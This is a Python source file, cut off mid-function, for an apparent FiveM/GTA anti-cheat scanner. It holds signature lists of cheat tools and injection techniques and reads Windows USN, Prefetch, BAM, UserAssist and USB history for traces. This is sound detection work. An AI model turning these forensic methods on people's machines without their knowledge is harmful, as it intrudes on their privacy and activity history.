import os
import sys
import struct
import time
import socket
import getpass
import threading
try:
    import psutil
except Exception:
    psutil = None
import subprocess
import hashlib
import winreg
import re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# Nombre de workers adaptatif selon les CPUs disponibles
_CPU_CORES = os.cpu_count() or 4
_CPU_WORKERS = min(max(_CPU_CORES * 2, 8), 32)
from src.authenticode import get_file_sha256, check_authenticode_signature, is_trusted_system_or_signed
from src.scorer import evaluate_app_risk, calculate_overall_risk_grouped

# ─────────────────────────────────────────────
# SIGNATURES DE CHEATS FIVEM SPÉCIFIQUES
# ─────────────────────────────────────────────
SPECIFIC_CHEATS = [
    # FiveM / GTA-related names
    "eulen", "redengine", "hx_menu", "skript_executor", "lynx_menu", 
    "ham_executor", "mafia_menu", "desync_menu", "brutal_cheat", 
    "dopamine_executor", "tz_menu", "fallout_menu", "unmatched_cheat",
    "kiddions", "stand", "stand_menu", "cherax", "2take1", "impulse", 
    "ozark", "phantom", "phantom_x", "x-force", "luna", "midnight", 
    "orbit", "menyoo",
    
    # Variants / executable / module naming
    "eulen.exe", "redengine.exe", "lynx.asi", "hx.asi", "dopamine.lua", 
    "vanity",
    
    # Generic names frequently seen in suspicious tools
    "cheat_loader", "cheatloader", "mod_loader", "modloader", "menu_loader", 
    "injector", "injector.exe", "loader.exe", "executor.exe", "external.exe", "internal.exe",

    # Added cheat names & sample signatures (realboss, masqueraded loader, spoty)
    "hammafia", "susano", "tz project", "tzx", "skript", "phaze", "lumia", 
    "keyser", "tiago", "projectyx", "kekhack", "lunacy", "hx hacks",
    "realboss", "realboss.v4", "spoty.bat", "ejtgv5l1d", "ntoskrnl.exe",

    # ── Cheats modernes FiveM (2024-2026) ──
    "nitwit", "nitwit.exe", "nit_wit",
    "quasar", "quasar菜单",
    "sapphire", "sapphire_menu",
    "ox_lib", "oxlib",
    "jaguar", "jaguar_menu",
    "infinity", "infinity_menu",
    "aria", "aria_menu",
    "nova", "nova_menu",
    "fluxus", "synapse", "scriptware",
    "krnl", "hydrogen", "celery",
    "evolve", "evolve_menu",
    "rise", "rise_menu",
    "nixware", "gamesense",
    "absolute", "absolute_menu",
    "vex", "vex_menu",
    "cobra", "cobra_menu",
    "spoon", "spoon_menu",
    "dark", "dark_menu",
    "fivem_menu", "fivemcheat",
    "lua_executor", "js_executor", "nodemenu",
    "menulib", "menulibrary",
    "citizenfx_cheat", "cfx_hack",
    "executor_external", "executor_internal",
    "game_overlay", "esp_wallhack", "aimbot",
    "ragebot", "legitbot", "silentaim",
    "hwid_spoof", "hwid_spoofer",
    "temploader", "temp_load",
    "undetected", "undetected_loader",
    "bypasser", "anti_ac", "anticheat_bypass",
]

SUSPICIOUS_KEYWORDS = [
    "cheat", "hack", "hacker", "modmenu", "mod_menu", "mod menu", 
    "executor", "injector", "injection", "loader", "bypass", "spoof", 
    "spoofer", "hwid", "hwid_spoofer", "streamproof", "stream_proof", 
    "undetected", "silentaim", "silent_aim", "aimbot", "wallhack", "esp", 
    "triggerbot", "noclip", "godmode", "god_mode", "freecam", "teleport", 
    "lua_executor", "luaexecutor", "script_executor", "asi_loader", "dll_loader",
    "realboss", "spoty.bat"
]

TECHNICAL_INDICATORS = [
    "process_injection", "manual_map", "reflective_loader", "dll_injection", 
    "memory_injection", "process_hollowing", "shellcode", "hook", "game_hook", 
    "overlay", "d3d_hook", "dxgi_hook", "render_hook", "memory_editor", "memory_patch"
]

LOW_CONFIDENCE_TERMS = [
    "menu", "tool", "utility", "trainer", "launcher", "helper", "overlay", 
    "debug", "developer", "dev", "test"
]

CHEAT_EXTENSIONS = {".asi", ".lua", ".dll", ".exe", ".ini", ".vbs", ".bat", ".ps1"}
ARCHIVE_EXTENSIONS = {".zip", ".rar", ".7z", ".tar", ".gz"}

# Extensions de jeux GTA/FiveM (assets volumineux, PAS des cheats) — à ignorer systématiquement
GAME_ASSET_EXTENSIONS = {
    ".rpf", ".yft", ".ytd", ".ymap", ".ytyp", ".ydr", ".ydd", ".ybn",
    ".ytd", ".ycd", ".ysc", ".meta", ".xml",
    ".wav", ".ogg", ".mp3",
    ".gfx", ".dds", ".png", ".jpg",
}

# Taille max d'un fichier à scanner en détail (100 MB).
# Au-delà c'est un asset de jeu, pas un cheat.
MAX_CHEAT_FILE_SIZE = 100 * 1024 * 1024  # 100 MB

# Extentions inoffensives à ignorer immédiatement (gain de temps massif)
IGNORED_EXTENSIONS = {
    ".pdf", ".txt", ".png", ".jpg", ".jpeg", ".gif", ".webp", ".bmp", ".ico", ".svg",
    ".mp3", ".mp4", ".avi", ".mkv", ".wav", ".ogg", ".flac", ".webm",
    ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".csv",
    ".css", ".html", ".htm", ".json", ".xml", ".log", ".md", ".ttf", ".woff", ".woff2",
    ".dat", ".tmp", ".pak", ".bin", ".cache", ".idx", ".db", ".sqlite", ".store",
    # Assets de jeu GTA (volumeux, inutile de les scanner)
    ".rpf", ".yft", ".ytd", ".ymap", ".ytyp", ".ydr", ".ydd", ".ybn",
    ".ycd", ".ysc", ".gfx", ".dds",
}

# Dossiers/Fichiers de type "cache" ou inutiles à sauter instantanément
IGNORED_DIR_PREFIXES = ("cache", "cached", "crash", "logs", "temp", "tmp", "asset", "webcache")


KNOWN_CHEAT_HASHES = {
    # Cheat 1 (loader.rar -> ntoskrnl.exe)
    "8e79140f00872ae0c3323e4bef2d797ab0a44a423d842818e3510dad649abce7": "Cheat 1 Sample (ntoskrnl.exe masqueraded loader)",
    "28c698491cf2672f864a68025772e027": "Cheat 1 MD5 Hash",
    # Cheat 2 (realboss.v4.zip -> loader.exe)
    "620890674d5fd3607e26f034b1d4a020956fe1902cb80824293ee4a49f344e0c": "Cheat 2 Sample (realboss.v4.zip -> loader.exe)",
    "8e54a8042b791d5f01cf529f0054c735": "Cheat 2 MD5 Hash",
    # Cheat Ham Mafia v2.8 (loader (1).rar)
    "1ff3a1b5bf064fa3c9d2597a0d9d9edb4d43f0594fd13faf70c629822d59e34b": "Ham Mafia Loader v2.8 (loader (1).rar)",
    "2a38b01ed258a0f08a9188d72e05a612": "Ham Mafia Loader v2.8 MD5 Hash"
}

# Noms de processus/fichiers système officiels Windows
# S'ils sont trouvés HORS de C:\Windows\System32 ou C:\Windows\SysWOW64, il s'agit d'une usurpation/cheat (Masquerading)
SYSTEM_PROCESS_NAMES = {
    "ntoskrnl.exe", "svchost.exe", "lsass.exe", "csrss.exe", 
    "smss.exe", "winlogon.exe", "services.exe", "taskhostw.exe", 
    "conhost.exe", "ctfmon.exe", "spoolsv.exe"
}

LEGITIMATE_FRAMEWORKS = [
    "microsoft.extensions.", "system.reactive.", "newtonsoft.json",
    "eaanticheat", "easyanticheat", "battleye", "vanguard", "ricochet",
    "playnite", "antigravity", "visual studio", "docker", "node_modules",
    "citizenfx.", "citizengame", "fivem", "gta5", "rdr2",
    "rockstar", "social club", "epic online", "epicgames",
    "chromium", "electron", "cef", "libcef", "chrome_elf",
    "steam", "valve", "spotify", "medal", "discord",
    "nvidia", "amd", "intel", "realtek",
    "windows defender", "mpksl", "mpdefender",
    "xampp", "php", "mysql", "apache",
    "vscode", "visual studio code", "git", "node.js", "npm",
    # Notre propre application
    "anti-scan", "antiscan", "adamzoda", "exedownloader", "antyscan",
    "anti_scan", "anti defense system",
]

# ─────────────────────────────────────────────
# IDENTIFICATION BINAIRE — VRAI NOM DES CHEATS
# Strings uniques intégrés dans chaque cheat — même si le fichier est renommé
# (ex: xxkfn.exe → "NitWit Loader v3.1")
# Chaque liste contient des chaînes qui n'apparaissent QUE dans ce cheat.
# Suffisamment courts pour être rapides, suffisamment spécifiques pour éviter les FP.
# ─────────────────────────────────────────────
CHEAT_BINARY_SIGNATURES = {
    # ── NitWit / NitWitCleaner ──
    "NitWit Loader": [
        "nitwit", "NitWit", "NWLoader", "nw_loader", "nitwit_cleaner",
        "nitwit.lua", "NWMenu", "nwmenu", "nitwit_key",
        "nitwit_version", "NITWIT_", "NitWitMenu",
    ],
    # ── Eulen Executor ──
    "Eulen Executor": [
        "eulen", "EULEN", "EulenExecutor", "eulen.lua", "eulen_key",
        "EulenMenu", "eulen_version", "eulenexec", "EULEN_LOADER",
        "eulen_cheat", "EulenAC",
    ],
    # ── RedEngine ──
    "RedEngine": [
        "redengine", "RedEngine", "red_engine", "REDENGINE",
        "RedEngineMenu", "redengine_key", "red_engine_loader",
        "RedEngineLoader", "REDENGINE_BYPASS",
    ],
    # ── HX Menu / HX Hacks ──
    "HX Hacks": [
        "hxhacks", "HXHacks", "hx_menu", "HX_MENU", "hxmenu",
        "hx_hacks", "HXMenu", "hx.asi", "HX_LOADER", "hxloader",
        "HXExecutor",
    ],
    # ── Kiddion's Modest Menu ──
    "Kiddion's Modest Menu": [
        "kiddion", "Kiddion", "KIDDION", "modest_menu", "ModestMenu",
        "kiddions", "Kiddion's", "modest-menu", "kiddion_menu",
        "kiddion_key",
    ],
    # ── Stand Menu ──
    "Stand Menu": [
        "stand_menu", "StandMenu", "STAND_MENU", "stand.dll",
        "stand_key", "StandLoader", "stand_loader", "STAND_CHEAT",
        "stand_bypass",
    ],
    # ── Cherax ──
    "Cherax": [
        "cherax", "Cherax", "CHERAX", "cherax_menu", "CheraxMenu",
        "cherax_key", "CheraxLoader", "cherax.dll",
    ],
    # ── 2Take1 Menu ──
    "2Take1 Menu": [
        "2take1", "2Take1", "2TAKE1", "twotake1", "TwoTake1",
        "2t1_menu", "2take1_menu", "2T1Loader", "2take1_key",
        "TwoTakeOne",
    ],
    # ── Impulse ──
    "Impulse": [
        "impulse_menu", "ImpulseMenu", "IMPULSE_MENU",
        "impulse_key", "ImpulseLoader", "impulse.dll",
        "ImpulseCheat", "IMPULSE_BYPASS",
    ],
    # ── Ozark ──
    "Ozark": [
        "ozark_menu", "OzarkMenu", "OZARK_MENU", "ozark_key",
        "OzarkLoader", "ozark.dll", "OzarkCheat",
    ],
    # ── Luna Menu ──
    "Luna Menu": [
        "luna_menu", "LunaMenu", "LUNA_MENU", "luna_key",
        "LunaLoader", "luna_cheat", "LunaExecutor",
        "luna_bypass",
    ],
    # ── Dopamine Executor ──
    "Dopamine Executor": [
        "dopamine", "Dopamine", "DOPAMINE", "dopamine_menu",
        "DopamineMenu", "dopamine_key", "DopamineLoader",
        "dopamine.lua", "dopamine_exec",
    ],
    # ── HamMafia ──
    "HamMafia": [
        "hammafia", "HamMafia", "HAMMAFIA", "ham_mafia",
        "HamMafiaLoader", "hammafia_key", "ham_menu",
        "hammafiaexe",
    ],
    # ── TZ Menu / TZ Project ──
    "TZ Menu": [
        "tz_menu", "TZMenu", "TZ_MENU", "tz_project",
        "TZProject", "tzx_menu", "TZXMenu", "tz_key",
        "tzproject", "TZPROJECT",
    ],
    # ── Susano ──
    "Susano": [
        "susano", "Susano", "SUSANO", "susano_menu",
        "SusanoMenu", "susano_key", "SusanoLoader",
        "susano_cheat",
    ],
    # ── Lynx Menu ──
    "Lynx Menu": [
        "lynx_menu", "LynxMenu", "LYNX_MENU", "lynx_key",
        "LynxLoader", "lynx.asi", "LynxCheat",
        "lynxmenu",
    ],
    # ── Quasar Menu ──
    "Quasar Menu": [
        "quasar_menu", "QuasarMenu", "QUASAR_MENU", "quasar_key",
        "QuasarLoader", "quasar_cheat", "QUASAR_BYPASS",
    ],
    # ── Sapphire Menu ──
    "Sapphire Menu": [
        "sapphire_menu", "SapphireMenu", "SAPPHIRE_MENU",
        "sapphire_key", "SapphireLoader", "sapphire_cheat",
    ],
    # ── Absolute ──
    "Absolute Cheat": [
        "absolute_menu", "AbsoluteMenu", "ABSOLUTE_MENU",
        "absolute_key", "AbsoluteLoader", "absolute_cheat",
        "AbsoluteBypass",
    ],
    # ── Jaguar Menu ──
    "Jaguar Menu": [
        "jaguar_menu", "JaguarMenu", "JAGUAR_MENU",
        "jaguar_key", "JaguarLoader", "jaguar_cheat",
    ],
    # ── Evolve Menu ──
    "Evolve Menu": [
        "evolve_menu", "EvolveMenu", "EVOLVE_MENU",
        "evolve_key", "EvolveLoader", "evolve_cheat",
    ],
    # ── NixWare ──
    "NixWare": [
        "nixware", "NixWare", "NIXWARE", "nixware_menu",
        "NixWareMenu", "nixware_key", "nixware_cheat",
    ],
    # ── GameSense ──
    "GameSense": [
        "gamesense", "GameSense", "GAMESENSE", "game_sense",
        "GameSenseMenu", "gamesense_key", "gamesense_cheat",
    ],
    # ── Phantom X ──
    "Phantom X": [
        "phantom_x", "PhantomX", "PHANTOM_X", "phantom_menu",
        "PhantomMenu", "phantom_key", "PhantomLoader",
    ],
    # ── Menyoo ──
    "Menyoo": [
        "menyoo", "Menyoo", "MENYOO", "menyoo_menu",
        "MenyooMenu", "menyoo_key", "MenyooLoader",
    ],
    # ── ReaBoss / realboss ──
    "ReaBoss Cheat": [
        "realboss", "RealBoss", "REALBOSS", "real_boss",
        "realboss_v4", "RealBossLoader", "realboss_key",
        "REALBOSS_BYPASS",
    ],
    # ── Spoty (spoty.bat) ──
    "Spoty Cleaner": [
        "spoty.bat", "spoty_bat", "SPOTY", "spotyloader",
        "SpotyBat", "spoty_cleaner",
    ],
    # ── HWID Spoofer générique ──
    "HWID Spoofer": [
        "hwid_spoof", "HWIDSpoof", "HWID_SPOOF", "hwid_spoofer",
        "HWIDSpoofer", "spoof_hwid", "SpoofHWID",
        "hwid_bypass", "ban_bypass", "BanBypass",
    ],
    # ── Loader / Injector générique ──
    "Generic Cheat Loader": [
        "cheat_loader", "CheatLoader", "CHEAT_LOADER",
        "dll_injector", "DLLInjector", "manual_map",
        "ManualMap", "reflective_loader", "ReflectiveLoader",
        "process_hollowing", "ProcessHollowing",
    ],
    # ── Phaze Menu ──
    "Phaze Menu": [
        "phaze_menu", "PhazeMenu", "PHAZE_MENU",
        "phaze_key", "PhazeLoader", "phaze_cheat",
    ],
    # ── Keyser ──
    "Keyser": [
        "keyser_menu", "KeyserMenu", "KEYSER",
        "keyser_key", "KeyserLoader",
    ],
    # ── ProjectYX ──
    "ProjectYX": [
        "projectyx", "ProjectYX", "PROJECTYX",
        "project_yx", "projectyx_key", "ProjectYXLoader",
    ],
    # ── Infinity Menu ──
    "Infinity Menu": [
        "infinity_menu", "InfinityMenu", "INFINITY_MENU",
        "infinity_key", "InfinityLoader", "infinity_cheat",
    ],
    # ── Aria Menu ──
    "Aria Menu": [
        "aria_menu", "AriaMenu", "ARIA_MENU",
        "aria_key", "AriaLoader", "aria_cheat",
    ],
    # ── Nova Menu ──
    "Nova Menu": [
        "nova_menu", "NovaMenu", "NOVA_MENU",
        "nova_key", "NovaLoader", "nova_cheat",
    ],
    # ── Cobra Menu ──
    "Cobra Menu": [
        "cobra_menu", "CobraMenu", "COBRA_MENU",
        "cobra_key", "CobraLoader", "cobra_cheat",
    ],
    # ── Vex Menu ──
    "Vex Menu": [
        "vex_menu", "VexMenu", "VEX_MENU",
        "vex_key", "VexLoader", "vex_cheat",
    ],
    # ── Orbit Menu ──
    "Orbit Menu": [
        "orbit_menu", "OrbitMenu", "ORBIT_MENU",
        "orbit_key", "OrbitLoader", "orbit_cheat",
    ],
}


def _identify_cheat_by_binary_strings(file_path: str, max_read: int = 5 * 1024 * 1024) -> dict | None:
    """
    Extrait les chaînes ASCII et UTF-16LE embarquées dans un binaire PE
    et les compare à CHEAT_BINARY_SIGNATURES pour identifier le vrai nom du cheat,
    même si le fichier a été renommé (ex: xxkfn.exe → "NitWit Loader").

    Performance : lit au maximum 5 MB (configurable), scan en ~10-50 ms.
    Retourne un dict {'real_name': ..., 'matched_strings': [...], 'severity': ...}
    ou None si aucune correspondance.
    """
    MIN_STR_LEN = 5  # Longueur minimum d'une chaîne à extraire

    try:
        if not os.path.isfile(file_path):
            return None
        fsize = os.path.getsize(file_path)
        if fsize < 512:
            return None

        # ── ANTI-FP : Skip les binaires signés par un éditeur connu ──
        # VirtualBox (Oracle), BlueStacks, Malwarebytes, Brave, etc.
        # ne doivent JAMAIS être flaggés via fingerprinting
        if is_trusted_system_or_signed(file_path):
            return None

        with open(file_path, "rb") as f:
            raw = f.read(min(fsize, max_read))

        if not raw.startswith(b'MZ'):
            return None

        # ── Extraction ASCII ──
        ascii_strings = set()
        current = []
        for byte in raw:
            if 32 <= byte < 127:
                current.append(chr(byte))
            else:
                if len(current) >= MIN_STR_LEN:
                    ascii_strings.add("".join(current))
                current = []
        if len(current) >= MIN_STR_LEN:
            ascii_strings.add("".join(current))

        # ── Extraction UTF-16LE (2 octets par caractère) ──
        utf16_strings = set()
        i = 0
        current_u = []
        while i + 1 < len(raw):
            lo = raw[i]
            hi = raw[i + 1]
            if hi == 0 and 32 <= lo < 127:
                current_u.append(chr(lo))
                i += 2
            else:
                if len(current_u) >= MIN_STR_LEN:
                    utf16_strings.add("".join(current_u))
                current_u = []
                i += 1
        if len(current_u) >= MIN_STR_LEN:
            utf16_strings.add("".join(current_u))

        all_strings = ascii_strings | utf16_strings

        # ── Version info PE (Resources) — souvent le champ ProductName ──
        version_strings = set()
        for marker in (b"ProductName\x00\x00", b"F\x00i\x00l\x00e\x00D\x00e\x00s\x00c\x00r\x00"):
            idx = raw.find(marker)
            if idx != -1:
                chunk = raw[idx: idx + 256]
                try:
                    decoded = chunk.decode('utf-16-le', errors='replace').replace('\x00', ' ').strip()
                    version_strings.add(decoded[:64])
                except Exception:
                    pass

        all_strings |= version_strings

        # ── Matching contre CHEAT_BINARY_SIGNATURES ──
        best_match_name  = None
        best_matched     = []
        best_score       = 0

        for cheat_name, patterns in CHEAT_BINARY_SIGNATURES.items():
            matched = []
            for pattern in patterns:
                p_lower = pattern.lower()
                for s in all_strings:
                    s_lower = s.lower()
                    # Pour les patterns courts (<8 chars), exiger une correspondance
                    # en tant que mot entier (délimité par _/./ /début/fin)
                    if len(p_lower) < 8:
                        # Match exact ou délimité par des séparateurs
                        if s_lower == p_lower or f"_{p_lower}" in s_lower or f"{p_lower}_" in s_lower or f".{p_lower}" in s_lower or f"{p_lower}." in s_lower:
                            matched.append(pattern)
                            break
                    else:
                        if p_lower in s_lower:
                            matched.append(pattern)
                            break

            score = len(matched)
            if score > best_score:
                best_score       = score
                best_match_name  = cheat_name
                best_matched     = matched

        # Seuil relevé à 3 patterns distincts pour confirmer (anti-FP renforcé)
        # Avec 2 c'était trop facile de matcher par accident (VirtualBox, regedit, etc.)
        if best_score >= 3 and best_match_name:
            return {
                "real_name"     : best_match_name,
                "matched_strings": best_matched[:5],
                "match_count"   : best_score,
                "severity"      : "CRITICAL",
            }

    except (PermissionError, OSError):
        pass
    except Exception:
        pass

    return None


# ─────────────────────────────────────────────
# DÉTECTION DYNAMIQUE DES DISQUES MONTÉS
# ─────────────────────────────────────────────
def get_all_mounted_drives():
    """Détecte tous les disques/partitions montés (C:, D:, E:, etc.)"""
    drives = []
    if psutil is None:
        return [{"letter": "C:", "mountpoint": "C:\\", "fstype": "NTFS", "total_gb": 0, "used_pct": 0, "device": ""}]

    try:
        for part in psutil.disk_partitions(all=False):
            if part.fstype and 'cdrom' not in part.opts.lower():
                drive_letter = part.mountpoint.rstrip("\\")
                try:
                    usage = psutil.disk_usage(part.mountpoint)
                    drives.append({
                        "letter": drive_letter,
                        "mountpoint": part.mountpoint,
                        "fstype": part.fstype,
                        "total_gb": round(usage.total / (1024**3), 1),
                        "used_pct": usage.percent,
                        "device": part.device
                    })
                except (PermissionError, OSError):
                    drives.append({
                        "letter": drive_letter,
                        "mountpoint": part.mountpoint,
                        "fstype": part.fstype,
                        "total_gb": 0,
                        "used_pct": 0,
                        "device": part.device
                    })
    except Exception:
        drives.append({"letter": "C:", "mountpoint": "C:\\", "fstype": "NTFS", "total_gb": 0, "used_pct": 0, "device": ""})
    return drives

# ─────────────────────────────────────────────
# FORENSIQUE : SCAN DU JOURNAL USN NTFS - MULTI-DISQUES
# ─────────────────────────────────────────────
def scan_usn_journal_drive(drive_letter):
    """Analyse le journal USN d'un seul disque."""
    deleted_cheats = []
    try:
        res = subprocess.run(
            ["fsutil", "usn", "queryjournal", f"{drive_letter}"],
            capture_output=True, text=True, encoding='utf-8', errors='replace', timeout=3
        ,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        if res.returncode != 0:
            return deleted_cheats

        next_usn = None
        for line in res.stdout.splitlines():
            if "USN suivant" in line or "Next USN" in line:
                parts = line.split(":")
                if len(parts) > 1:
                    next_usn_str = parts[1].strip().split()[0]
                    next_usn = int(next_usn_str, 16)
                    break
        
        if next_usn is None:
            return deleted_cheats

        # Lire les 50 derniers Mo (couvre jusqu'à 72h d'activité système)
        start_usn = max(0, next_usn - 50 * 1024 * 1024)
        
        read_res = subprocess.run(
            ["fsutil", "usn", "readjournal", f"{drive_letter}", f"startusn={hex(start_usn)}", "csv"],
            capture_output=True, text=True, encoding='utf-8', errors='replace', timeout=15,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        if read_res.returncode != 0:
            return deleted_cheats

        SUSPECT_KEYWORDS = [
            "cheat", "inject", "loader", "bypass", "hack", "exploit", "spoofer",
            "menu", "mod", "hook", "trainer", "dumper", "eulen", "redengine",
            "lynx", "kiddion", "stand", "cherax", "subversion", "dopamine", "fallout",
            "unmatched", "mafia", "desync", "brutal", "skript", "hx"
        ]

        seen = set()
        for line in read_res.stdout.splitlines():
            parts = line.split(",")
            if len(parts) < 8:
                continue
            
            filename = parts[1].strip('"')
            reason_str = parts[3].strip()
            timestamp = parts[4].strip('"')
            
            try:
                reason_val = int(reason_str, 16)
            except ValueError:
                continue
                
            # USN_REASON_FILE_DELETE = 0x00000200
            if (reason_val & 0x00000200) != 0:
                name_lower = filename.lower()
                ext = os.path.splitext(name_lower)[1]
                
                if any(legit in name_lower for legit in LEGITIMATE_FRAMEWORKS):
                    continue

                is_suspicious_deletion = False
                
                # 1. Tous les fichiers .asi, .lua et .pf (fichiers Prefetch effacés) supprimés sont suspects
                if ext in {".asi", ".lua", ".pf"}:
                    is_suspicious_deletion = True
                # 2. Fichiers .exe, .dll, .bat, .ps1, .sys, .ini avec mot-clé suspect
                elif ext in CHEAT_EXTENSIONS:
                    if any(kw in name_lower for kw in SUSPECT_KEYWORDS):
                        is_suspicious_deletion = True

                if is_suspicious_deletion:
                    key = (filename, timestamp)
                    if key not in seen:
                        seen.add(key)
                        deleted_cheats.append({
                            "filename": filename,
                            "drive": drive_letter,
                            "timestamp": timestamp,
                            "reason": f"Fichier supprimé suspect '{filename}' ({'Trace Prefetch Effacée' if ext == '.pf' else 'Fichier Suspect'}) détecté sur {drive_letter} dans le journal USN le {timestamp}."
                        })
    except Exception:
        pass
        
    return deleted_cheats

def scan_usn_journal_all_drives(drives, progress_callback=None, pct=76):
    """Analyse le journal USN de TOUS les disques détectés — en parallèle."""
    if progress_callback:
        progress_callback("Forensique USN NTFS", pct, "Analyse des suppressions récentes sur tous les disques...")

    ntfs_drives = [d for d in drives if d.get("fstype", "").upper() == "NTFS"]
    all_deleted = []

    if not ntfs_drives:
        return all_deleted

    with ThreadPoolExecutor(max_workers=min(len(ntfs_drives), _CPU_WORKERS)) as ex:
        futures = {ex.submit(scan_usn_journal_drive, d["letter"]): d["letter"] for d in ntfs_drives}
        for i, future in enumerate(as_completed(futures)):
            letter = futures[future]
            if progress_callback:
                sub_pct = pct + int((i / max(len(ntfs_drives), 1)) * 3)
                progress_callback("Forensique USN NTFS", sub_pct, f"Journal USN terminé : {letter}")
            try:
                all_deleted.extend(future.result())
            except Exception:
                pass

    return all_deleted

# ─────────────────────────────────────────────
# FORENSIQUE WINDOWS : PREFETCH SCANNER & DETECTEUR DE NETTOYAGE
# ─────────────────────────────────────────────
def scan_windows_prefetch(progress_callback=None, pct=73):
    prefetch_dir = r"C:\Windows\Prefetch"
    traces = []
    total_pf_count = 0
    is_wiped = False
    
    if progress_callback:
        progress_callback("Forensique Prefetch", pct, "Analyse des traces d'exécution Windows et des lecteurs externes...")

    if not os.path.exists(prefetch_dir):
        return {"traces": traces, "total_pf_count": 0, "is_wiped": True}

    try:
        all_entries = os.listdir(prefetch_dir)
        pf_files = [f for f in all_entries if f.lower().endswith(".pf")]
        total_pf_count = len(pf_files)

        if total_pf_count < 15:
            is_wiped = True

        for file in pf_files:
            exec_name = file.split("-")[0].lower()
            pf_path = os.path.join(prefetch_dir, file)
            
            if any(legit in exec_name for legit in LEGITIMATE_FRAMEWORKS):
                continue

            # 1. Vérification par signature de cheat connu
            is_cheat_match = False
            matched_cheat = None
            for cheat in SPECIFIC_CHEATS:
                if cheat in exec_name:
                    is_cheat_match = True
                    matched_cheat = cheat
                    break

            # 2. Extraction du chemin / lecteur d'origine depuis les métadonnées brutes Prefetch
            executed_from_external = False
            origin_info = ""
            try:
                with open(pf_path, "rb") as pf:
                    raw_data = pf.read(16384)
                    # Chercher des références de volumes ou de dossiers (ex: \VOLUME{...}\ or D:\, E:\)
                    import re as _re
                    drive_matches = _re.findall(b'\\\\VOLUME\\{[0-9a-fA-F-]+\\}|\\\\DEVICE\\\\HARDDISKVOLUME[0-9]+', raw_data, _re.IGNORECASE)
                    if drive_matches:
                        v_str = drive_matches[0].decode('utf-8', errors='ignore')
                        origin_info = f" Volume: {v_str}"
            except Exception:
                pass

            mtime = os.path.getmtime(pf_path)
            last_exec = datetime.fromtimestamp(mtime).strftime("%Y-%m-%d %H:%M:%S")

            if is_cheat_match:
                traces.append({
                    "cheat_signature": matched_cheat,
                    "executable_name": exec_name,
                    "prefetch_file"  : file,
                    "last_executed"  : last_exec,
                    "severity"       : "CRITICAL",
                    "description"    : f"Trace d'exécution Windows (Prefetch) pour cheat '{exec_name}' (Dernière exécution : {last_exec}){origin_info}"
                })

    except (PermissionError, OSError):
        pass

    return {
        "traces": traces,
        "total_pf_count": total_pf_count,
        "is_wiped": is_wiped
    }

# ─────────────────────────────────────────────
# FORENSIQUE : HISTORIQUE D'EXÉCUTION REGISTRE (BAM - Background Activity Moderator)
# ─────────────────────────────────────────────
def scan_windows_bam(progress_callback=None, pct=75):
    """
    Analyse le registre Windows (BAM) pour identifier les exécutables lancés et leur statut de risque.
    """
    traces = []
    if progress_callback:
        progress_callback("Forensique BAM", pct, "Analyse du registre Background Activity Moderator (BAM)...")

    path = r"SYSTEM\CurrentControlSet\Services\bam\State\UserSettings"
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
        i = 0
        while True:
            try:
                sid_name = winreg.EnumKey(key, i)
                sid_key = winreg.OpenKey(key, sid_name)
                j = 0
                while True:
                    try:
                        val_name, val_data, val_type = winreg.EnumValue(sid_key, j)
                        if val_name and "\\" in val_name:
                            filename = os.path.basename(val_name)
                            match = _is_fivem_cheat_file(filename, val_name)
                            if match:
                                traces.append({
                                    "executable_name": filename,
                                    "exe_path": val_name,
                                    "severity": match.get("severity", "CRITICAL"),
                                    "description": f"Trace BAM détectée pour '{filename}' : {match['reason']}"
                                })
                        j += 1
                    except OSError:
                        break
                winreg.CloseKey(sid_key)
                i += 1
            except OSError:
                break
        winreg.CloseKey(key)
    except Exception:
        pass

    return traces

# ─────────────────────────────────────────────
# FORENSIQUE : HISTORIQUE EXPLORER (UserAssist)
# ─────────────────────────────────────────────
def scan_windows_userassist(progress_callback=None, pct=77):
    """
    Analyse le registre Windows (UserAssist) pour identifier les exécutables lancés via l'Explorateur.
    """
    import codecs
    traces = []
    if progress_callback:
        progress_callback("Forensique UserAssist", pct, "Analyse de l'historique Explorer (UserAssist)...")

    def decode_rot13(s):
        try:
            return codecs.decode(s, 'rot_13')
        except Exception:
            return s

    path = r"Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path)
        i = 0
        while True:
            try:
                guid_name = winreg.EnumKey(key, i)
                guid_path = f"{path}\\{guid_name}\\Count"
                try:
                    guid_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, guid_path)
                    j = 0
                    while True:
                        try:
                            val_name, val_data, val_type = winreg.EnumValue(guid_key, j)
                            decoded_name = decode_rot13(val_name)
                            if decoded_name and "\\" in decoded_name:
                                filename = os.path.basename(decoded_name)
                                match = _is_fivem_cheat_file(filename, decoded_name)
                                if match:
                                    traces.append({
                                        "executable_name": filename,
                                        "exe_path": decoded_name,
                                        "severity": match.get("severity", "CRITICAL"),
                                        "description": f"Trace UserAssist (Explorer) détectée pour '{filename}' : {match['reason']}"
                                    })
                            j += 1
                        except OSError:
                            break
                    winreg.CloseKey(guid_key)
                except OSError:
                    pass
                i += 1
            except OSError:
                break
        winreg.CloseKey(key)
    except Exception:
        pass

    return traces

# ─────────────────────────────────────────────
# FORENSIQUE : HISTORIQUE DES PÉRIPHÉRIQUES USB/SSD EXTERNES
# ─────────────────────────────────────────────
def scan_usb_storage_history(progress_callback=None, pct=79):
    """
    Interroge le registre Windows USBSTOR pour lister tous les périphériques
    de stockage USB/SSD externes connectés historiquement à cette machine.
    Détecte si un disque a été récemment débranché (potentiel contournement).
    """
    if progress_callback:
        progress_callback("Forensique USB/SSD", pct, "Analyse de l'historique des périphériques de stockage...")
    
    usb_devices = []
    currently_connected = set()
    
    # Récupérer les lecteurs actuellement montés
    if psutil is not None:
        try:
            for part in psutil.disk_partitions(all=True):
                currently_connected.add(part.device.upper())
        except Exception:
            pass

    # Lire le registre USBSTOR
    try:
        usbstor_key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"SYSTEM\CurrentControlSet\Enum\USBSTOR"
        )
        
        i = 0
        while True:
            try:
                device_class = winreg.EnumKey(usbstor_key, i)
                i += 1
                
                # Chaque sous-clé contient les instances
                device_class_key = winreg.OpenKey(usbstor_key, device_class)
                j = 0
                while True:
                    try:
